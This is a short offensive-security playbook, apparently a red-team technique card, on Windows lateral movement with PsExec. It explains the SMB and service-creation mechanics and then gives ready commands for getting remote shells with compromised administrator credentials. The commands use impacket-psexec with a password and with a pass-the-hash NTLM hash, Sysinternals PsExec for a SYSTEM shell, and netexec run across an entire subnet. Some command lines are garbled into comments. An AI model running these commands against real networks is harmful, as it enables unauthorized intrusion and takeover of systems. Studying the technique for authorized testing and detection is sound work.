# Lateral Movement via PsExec

## When to Use
- You have compromised valid domain administrator credentials or a local administrator account for a target system.
- You need to obtain an interactive command shell (`cmd.exe` or `powershell.exe`) or execute a payload on a remote Windows machine.
- SMB (Port 445) and RPC (Port 135) are accessible.


## Prerequisites
- Authorized scope and rules of engagement for the target environment
- Appropriate tools installed on the attack/analysis platform
- Understanding of the target technology stack and architecture
- Documentation template ready for findings and evidence capture

## Workflow

### Phase 1: Mechanics of PsExec

PsExec works by performing the following actions:
1. Authenticates via SMB over Port 445.
2. Connects to the `ADMIN$` hidden share (usually `C:\Windows`).
3. Uploads a service executable (e.g., `PSEXESVC.exe`).
4. Uses the Service Control Manager (SCM) via RPC to create and start a Windows service wrapping the executable.
5. Communicates input/output back via named pipes over SMB.

### Phase 2: Remote Execution with Impacket (Linux)

```bash
# # impacket-psexec Administrator:Password123!@192.168.1.100

# Using Pass-the-Hash (PTH) impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:88e4d9fabaecf3dec18dd80905521b29 Administrator@192.168.1.100
```

### Phase 3: Remote Execution with Sysinternals PsExec (Windows)

```cmd
# # PsExec.exe \\192.168.1.100 -u Domain\Administrator -p Password123! cmd.exe

# Execute SYSTEM shell PsExec.exe \\192.168.1.100 -s -u Domain\Administrator -p Password123! cmd.exe
```

### Phase 4: Automated Lateral Movement with CrackMapExec / NetExec

```bash
# netexec smb 192.168.1.0/24 -u Administrator -p Password123! -x "whoami"
```
